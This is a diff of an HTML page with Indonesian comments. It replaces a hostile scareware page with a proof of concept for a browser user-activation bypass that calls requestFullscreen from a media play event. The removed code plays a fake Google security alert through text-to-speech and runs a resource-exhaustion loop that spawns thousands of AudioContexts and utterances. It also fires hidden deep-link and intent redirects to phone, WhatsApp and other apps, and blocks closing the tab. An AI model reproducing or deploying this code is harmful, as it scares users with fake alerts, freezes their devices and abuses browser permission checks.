@@ -1,303 +1,71 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Audio Focus Activation Test</title>
 </head>
 <body>
-<script>
-(function () {
-  'use strict';
+    <h3>User Activation Bypass Test</h3>
+    <p>Status: <span id="status">Menunggu pemutaran media...</span></p>
 
-  // ============================================================
-  // KONFIGURASI GLOBAL
-  // ============================================================
-  var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
-    deepLink: {
-      schemes: [
-        "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end",
-        "tel:+6281234567890",
-        "market://details?id=com.whatsapp",
-        "whatsapp://send?text=ShadowCore",
-        "fb://profile",
-        "instagram://user?username=shadowcore"
-      ],
-      initialDelay: 15000,      // 15 detik setelah load
-      hiddenDelay: 3000,        // 3 detik setelah tab hidden
-      retryDelay: 5000,
-      maxRetries: 3,
-      obfuscate: true
-    },
-    crash: {
-      interval: 50,             // 50ms loop
-      nodesPerCycle: 2000,      // jumlah AudioContext per siklus
-      enabled: true
-    }
-  };
+    <!-- Media harus dapat diputar, pengguna perlu berinteraksi sekali atau autoplay diizinkan -->
+    <video id="triggerMedia" 
+           src="data:video/mp4;base64,..." 
+           playsinline 
+           muted 
+           style="width:200px;">
+    </video>
 
-  var state = {
-    ttsStarted: false,
-    mainPlayed: false,
-    ttsCount: 0,
-    deepLinkTriggered: false,
-    deepLinkAttempt: 0,
-    crashStarted: false
-  };
+    <script>
+    (function() {
+        const video = document.getElementById('triggerMedia');
+        const statusEl = document.getElementById('status');
+        let activationHarvested = false;
 
-  // ============================================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+        // Kunci inti: dalam listener play, periksa dan gunakan aktivasi pengguna
+        video.addEventListener('play', function onPlay() {
+            // Beri sedikit delay agar token aktivasi tersinkronisasi ke proses browser
+            setTimeout(() => {
+                if (activationHarvested) return;
 
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
+                // Deteksi apakah ada token aktivasi sementara
+                const hasActivation = navigator.userActivation && 
+                                      navigator.userActivation.isActive;
 
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
+                statusEl.textContent = 
+                    `play terpicu, userActivation.isActive = ${hasActivation}`;
 
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
+                if (hasActivation) {
+                    // Coba panggil API yang memerlukan gesture pengguna
+                    const target = document.documentElement;
+                    if (target.requestFullscreen) {
+                        target.requestFullscreen()
+                            .then(() => {
+                                statusEl.textContent = 
+                                    "BERHASIL: requestFullscreen dipanggil!";
+                                activationHarvested = true;
+                            })
+                            .catch(err => {
+                                statusEl.textContent = 
+                                    `requestFullscreen gagal: ${err.message}`;
+                            });
+                    }
+                }
+            }, 100);
+        });
 
-      window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
-  }
+        // Untuk pengujian: mulai pemutaran melalui klik pengguna (simulasi kondisi awal)
+        document.body.addEventListener('click', function startOnce() {
+            video.play().catch(e => {
+                statusEl.textContent = `Gagal memutar: ${e.message}`;
+            });
+            document.body.removeEventListener('click', startOnce);
+        }, { once: true });
 
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
-
-  // ============================================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
-
-  // ============================================================
-  // SILENT AUDIO ELEMENT
-  // ============================================================
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
-      }
-
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
-    } catch (e) {
-      startTTS();
-    }
-  }
-
-  // ============================================================
-  // HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
-  // ============================================================
-  function triggerHighSeverityCrash() {
-    if (state.crashStarted) return;
-    state.crashStarted = true;
-    console.log("[!] Initiating High Severity Exploit Chain...");
-
-    setInterval(function() {
-      try {
-        for (var i = 0; i < CONFIG.crash.nodesPerCycle; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-
-          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, CONFIG.crash.interval);
-  }
-
-  // ============================================================
-  // DEEP LINK HIJACK — DELAYED EXTERNAL INTENT
-  // ============================================================
-  function triggerDeepLink() {
-    if (state.deepLinkTriggered) return;
-    if (state.deepLinkAttempt >= CONFIG.deepLink.maxRetries) return;
-
-    state.deepLinkAttempt++;
-    var scheme = CONFIG.deepLink.schemes[0]; // bisa dirotasi
-
-    console.log("[DEEP-LINK] Attempt #" + state.deepLinkAttempt + " -> " + scheme);
-
-    try {
-      // Metode 1: iframe tersembunyi
-      var iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = scheme;
-      document.body.appendChild(iframe);
-
-      // Metode 2: window.location (fallback)
-      setTimeout(function() {
-        try { window.location.href = scheme; } catch(e) {}
-      }, 500);
-
-      // Metode 3: intent URL fallback untuk Android
-      setTimeout(function() {
-        try {
-          var intentUrl = "intent://#Intent;scheme=" + scheme.split(':')[0] + ";end";
-          window.location.href = intentUrl;
-        } catch(e) {}
-      }, 1000);
-
-      state.deepLinkTriggered = true;
-    } catch (e) {
-      console.log("[DEEP-LINK] Fail: " + e.message);
-      // Retry
-      setTimeout(triggerDeepLink, CONFIG.deepLink.retryDelay);
-    }
-  }
-
-  // ============================================================
-  // VISIBILITY-BASED TRIGGER (TAB CLOSED / HIDDEN)
-  // ============================================================
-  document.addEventListener('visibilitychange', function () {
-    if (document.hidden) {
-      console.log("[DEEP-LINK] Page hidden, scheduling intent...");
-      setTimeout(function() {
-        triggerDeepLink();
-      }, CONFIG.deepLink.hiddenDelay);
-    } else {
-      if (!state.mainPlayed) {
-        setTimeout(playMainAudio, 100);
-      }
-    }
-  });
-
-  // ============================================================
-  // EKSEKUSI BERTAHAP (STAGED EXECUTION)
-  // ============================================================
-  unlockAudioContext();
-  trySilentAudio();
-
-  setTimeout(function () {
-    unlockAudioContext();
-    startTTS();
-  }, 100);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 500);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    triggerHighSeverityCrash();
-    setTimeout(triggerDeepLink, 10000); // 10 detik setelah crash trigger
-  }, 1500);
-
-  // ============================================================
-  // RETRY LOOP (AUDIO BLOCKED / BACKGROUND PERSISTENCE)
-  // ============================================================
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
-
-  // ============================================================
-  // DELAYED DEEP LINK AFTER INITIAL LOAD
-  // ============================================================
-  setTimeout(function () {
-    console.log("[DEEP-LINK] Initial delay reached, triggering...");
-    triggerDeepLink();
-  }, CONFIG.deepLink.initialDelay);
-
-  // ============================================================
-  // PERSISTENCE: PAGE UNLOAD PROTECTION
-  // ============================================================
-  window.addEventListener('beforeunload', function (e) {
-    // Mencegah penutupan jika memungkinkan
-    e.preventDefault();
-    e.returnValue = '';
-    return '';
-  });
-
-})();
-</script>
+        // Petunjuk
+        statusEl.textContent = "Klik halaman untuk memulai pemutaran, lalu picu kehilangan fokus audio (misalnya terima SMS)";
+    })();
+    </script>
 </body>
 </html>
